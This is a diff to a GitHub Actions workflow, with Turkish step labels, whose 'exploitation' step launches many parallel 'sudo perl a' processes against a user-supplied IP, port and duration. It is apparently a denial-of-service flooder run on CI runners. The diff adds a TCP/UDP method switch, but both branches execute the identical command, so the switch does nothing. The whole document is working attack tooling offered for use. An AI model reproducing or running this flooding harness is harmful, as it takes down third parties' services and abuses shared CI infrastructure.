@@ -46,16 +46,34 @@ jobs:
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
+          METHOD="${{ inputs.method }}"
           PIDS=()
-          for i in {1..6}; do
-            # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 perl a ${{ inputs.ip }} ${{ inputs.port }} 1024 ${{ inputs.time }} &
-            PIDS+=($!)
-          done
-          
+
+          if [ "$METHOD" = "tcp" ]; then
+            echo "TCP method seçildi"
+
+            for i in {1..6}; do
+              sudo perl a ${{ inputs.ip }} ${{ inputs.port }} 1024 ${{ inputs.time }} &
+              PIDS+=($!)
+            done
+
+          elif [ "$METHOD" = "udp" ]; then
+            echo "UDP method seçildi"
+
+             for i in {1..6}; do
+               sudo perl a ${{ inputs.ip }} ${{ inputs.port }} 1024 ${{ inputs.time }} &
+               PIDS+=($!)
+             done
+
+          else
+            echo "Geçersiz method: $METHOD"
+            exit 1
+          fi
+
           for pid in "${PIDS[@]}"; do
-            wait $pid
+             wait "$pid"
           done
+
 
       - name: Bitti
         run: |
